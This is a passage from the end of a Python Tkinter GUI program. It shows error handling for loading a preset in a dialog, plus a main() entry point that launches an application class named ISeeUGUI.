                    except Exception as e:
                        messagebox.showerror("Error", "Failed to load preset: {}".format(str(e)))
                        self.update_status("Error loading preset: {}".format(str(e)))
            
            ttk.Button(preset_dialog, text="Load", command=load_selected_preset).pack(pady=5)
            ttk.Button(preset_dialog, text="Cancel", command=preset_dialog.destroy).pack(pady=5)
            
        except Exception as e:
            messagebox.showerror("Error", "Failed to load preset: {}".format(str(e)))
            self.update_status("Error loading preset: {}".format(str(e)))

def main():
    """Main entry point."""
    try:
        root = tk.Tk()
        app = ISeeUGUI(root)
        root.mainloop()
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        logger.error("Unexpected error: {}".format(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
